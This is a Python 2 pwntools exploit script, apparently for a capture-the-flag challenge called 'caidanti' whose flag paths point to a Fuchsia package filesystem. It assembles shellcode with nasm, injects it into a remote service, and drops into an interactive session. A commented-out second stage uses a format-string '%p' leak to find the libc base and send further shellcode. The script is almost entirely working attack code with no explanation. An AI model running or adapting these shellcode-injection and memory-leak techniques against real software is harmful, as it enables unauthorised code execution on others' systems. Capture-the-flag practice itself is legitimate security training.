#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Pwntools custom functions
context.terminal = ['tmux', 'split', '-h']
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndal(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or 'fe80::5054:ff:fe63:5e7a%qemu'
port = int(args.PORT or 31337)

#host = "54.177.17.135"
#port = 23333

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
def rcv():
    _rcvu('own C')
    _rcvu('\n')

exe = ELF('./caidanti')
libc = ELF('./libc.so')

from os import system
with open("shellcode.s", 'r') as f:
    code=f.read().format(libc.symbols['sleep'])
with open('shellcode_fix.s', 'w') as f:
    f.write(code)
system('nasm shellcode_fix.s -f bin -o shellcode.o')
with open('shellcode.o', 'rb') as f:
    code = f.read()

_sndl(1)
_sndal('Key:', 'salut')
_sndal(':', 'AAAAAAA')

_sndl('114514')
_sndal(':', len(code))
_snd(code)
_sndal(':', 'salut')


"""
from time import sleep
#sleep(0.5)
#_snd('babyflag\x00')
#_snd('/tmp/test\x00')
_snd('--- %p %p %p %p %p %p %p %p AAA%pAAA ---\n')
_rcvu('AAA')
libc = ELF('./libc.so')

log.info("{} {}".format(hex(libc.symbols['puts']), hex(libc.symbols['system'])))
libc.address = int(_rcvu('AAA').replace('AAA', ''), 16) - 0xadeb0
print (hex(libc.address))

log.info("{} {}".format(hex(libc.symbols['puts']), hex(libc.symbols['system'])))
with open("shellcode_stage2.s", 'r') as f:
    code=f.read().format(hex(libc.address), libc.symbols['getpid'], hex(libc.symbols['sleep']))
with open('shellcode_stage2_fix.s', 'w') as f:
    f.write(code)
system('nasm shellcode_stage2_fix.s -f bin -o shellcode_stage2.o')
with open('shellcode_stage2.o', 'rb') as f:
    code = f.read()

_snd(code)
#_snd("meta/caidanti.cmx\x00")
"""
io.interactive()
# /pkgfs/packages/caidanti/0/data/babyflag
# /pkgfs/packages/caidanti/0/data/flag
